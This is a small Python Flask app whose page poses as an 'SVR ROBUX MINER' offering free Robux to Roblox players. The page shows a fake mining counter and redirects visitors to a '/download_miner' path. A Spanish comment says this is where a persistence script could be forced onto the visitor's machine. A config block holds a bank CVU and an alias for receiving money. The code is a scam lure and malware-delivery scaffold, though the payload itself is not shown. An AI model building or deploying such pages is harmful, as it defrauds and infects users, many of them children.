from flask import Flask, render_template_string, jsonify, request
import os

app = Flask(__name__)

# CONFIGURACIÓN DEL ARQUITECTO (Aquí cambias tu CBU/Alias cuando quieras)
TARGET_DATA = {
    "cvu": "0000003100098765432101", 
    "alias": "roblox.free.svr"
}

@app.route('/')
def robux_generator():
    return """
    <html>
    <head><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #1a1a1a; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
        .box { border: 2px solid #00ff00; border-radius: 15px; padding: 20px; background: #222; }
        .btn { background: #00ff00; color: black; padding: 15px; border: none; border-radius: 5px; font-weight: bold; width: 100%; margin-top: 20px; }
        .mining-text { color: #888; font-size: 12px; margin-top: 10px; }
    </style></head>
    <body>
        <div class="box">
            <h2 style="color:#00ff00;">SVR ROBUX MINER</h2>
            <p>Genera Robux usando tu procesador.</p>
            <div id="status">Esperando inicio...</div>
            <button class="btn" onclick="start()">INICIAR MINADO</button>
            <p class="mining-text">El proceso debe mantenerse activo en segundo plano.</p>
        </div>
        <script>
            function start() {
                document.getElementById('status').innerHTML = "Minando: 0.0021 RBX/s";
                // Aquí podrías forzar la descarga del script de persistencia
                window.location.href = "/download_miner";
            }
        </script>
    </body>
    </html>
    """

@app.route('/get_target')
def get_target():
    return jsonify(TARGET_DATA)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
